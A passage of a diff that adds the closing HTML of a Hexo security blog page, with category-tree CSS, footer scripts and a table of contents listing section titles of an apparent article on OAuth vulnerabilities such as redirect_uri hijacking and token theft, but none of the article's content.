href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
+  </div>
+</div>
+
+
+<style>
+/* Hacker / Terminal Style Category Tree */
+.category-tree .hacker-category-list {
+  padding-left: 20px;
+  font-family: 'Consolas', 'Courier New', monospace;
+  color: #fff;
+  list-style-type: circle; /* 'o' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list {
+  list-style-type: square; /* '■' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list .hacker-category-list {
+  list-style-type: square;
+}
+
+.category-tree .hacker-category-list-item {
+  margin: 6px 0;
+}
+
+.category-tree .hacker-category-list-link {
+  background-color: rgba(43, 188, 138, 0.1);
+  color: #2bbc8a;
+  text-decoration: none;
+  padding: 1px 6px;
+  font-weight: bold;
+  display: inline-block;
+}
+
+.category-tree .hacker-category-list-link:hover {
+  background-color: rgba(43, 188, 138, 0.2);
+  text-decoration: none;
+}
+
+.category-tree .hacker-category-list-count {
+  color: #2bbc8a;
+  margin-left: 5px;
+}
+</style>
+	</div>
+
+	<!-- article TOC placed below the category list; should scroll with page -->
+	<div class="toc-wrapper">
+		<div class="toc-widget">
+		
+			 <div class="toc">
+				 <span class="toc-title"><i class="fa fa-list"></i> Contents</span>
+				<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x00-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-article-text">0x00.基础知识</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#OAuth%E8%AF%9E%E7%94%9F%E5%89%8D%EF%BC%9A%E5%8F%A4%E8%80%81%E7%9A%84-%E5%AF%86%E7%A0%81%E5%85%B1%E4%BA%AB-%E6%97%B6%E4%BB%A3"><span class="toc-article-text">OAuth诞生前：古老的&quot;密码共享&quot;时代</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#OAuth-1-0%EF%BC%9A%E4%BB%8E-%E5%85%B1%E4%BA%AB%E5%AF%86%E7%A0%81-%E5%88%B0-%E5%AE%89%E5%85%A8%E6%8E%88%E6%9D%83"><span class="toc-article-text">OAuth 1.0：从&quot;共享密码&quot;到&quot;安全授权&quot;</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#OAuth-2-0%EF%BC%9A%E4%BB%8E%E5%85%B7%E4%BD%93%E5%8D%8F%E8%AE%AE%E5%88%B0%E6%9B%B4%E7%81%B5%E6%B4%BB%E6%9B%B4%E5%A4%8D%E6%9D%82%E7%9A%84%E6%8E%88%E6%9D%83%E6%A1%86%E6%9E%B6"><span class="toc-article-text">OAuth 2.0：从具体协议到更灵活更复杂的授权框架</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#OAuth-2-1%EF%BC%9A%E4%BB%8E%E2%80%9C%E5%8F%AF%E9%80%89%E5%AE%89%E5%85%A8%E2%80%9D%E5%88%B0%E2%80%9C%E9%BB%98%E8%AE%A4%E5%AE%89%E5%85%A8%E2%80%9D%E7%9A%84%E6%95%B4%E5%90%88%E5%8D%87%E7%BA%A7"><span class="toc-article-text">OAuth 2.1：从“可选安全”到“默认安全”的整合升级</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-article-text">总结</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x01-%E9%80%9A%E8%BF%87-OAuth-%E9%9A%90%E5%BC%8F%E6%B5%81%E7%A8%8B%E7%BB%95%E8%BF%87%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-article-text">0x01.通过 OAuth 隐式流程绕过身份验证</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x02-%E9%80%9A%E8%BF%87-OpenID-%E5%8A%A8%E6%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B3%A8%E5%86%8C%E5%AE%9E%E7%8E%B0-SSRF"><span class="toc-article-text">0x02.通过 OpenID 动态客户端注册实现 SSRF</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#OpenID-%E5%8A%A8%E6%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE"><span class="toc-article-text">OpenID 动态客户端注册协议</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x03-OAuth-%E8%B4%A6%E5%8F%B7%E5%BC%BA%E5%88%B6%E7%BB%91%E5%AE%9A"><span class="toc-article-text">0x03.OAuth 账号强制绑定</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x04-%E9%80%9A%E8%BF%87-redirect-uri-%E5%AE%9E%E7%8E%B0-OAuth-%E8%B4%A6%E5%8F%B7%E5%8A%AB%E6%8C%81"><span class="toc-article-text">0x04.通过 redirect_uri 实现 OAuth 账号劫持</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x05-%E5%88%A9%E7%94%A8%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E7%AA%83%E5%8F%96-OAuth-%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C"><span class="toc-article-text">0x05.利用开放重定向漏洞窃取 OAuth 访问令牌</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x06-%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E9%A1%B5%E9%9D%A2%E7%AA%83%E5%8F%96-OAuth-%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C"><span class="toc-article-text">0x06.通过代理页面窃取 OAuth 访问令牌</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%88%B6%E5%AD%90%E9%A1%B5%E9%9D%A2%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-article-text">父子页面的相关知识</span></a></li></ol></li></ol>
+			</div>
+		
+		</div>
+	</div>
+
+</div><!-- col-md-3 -->
+
+
+		</div>
+
+		
+
+	</div><!-- row -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 ZQ-Rookie-Hacker's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/toc.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
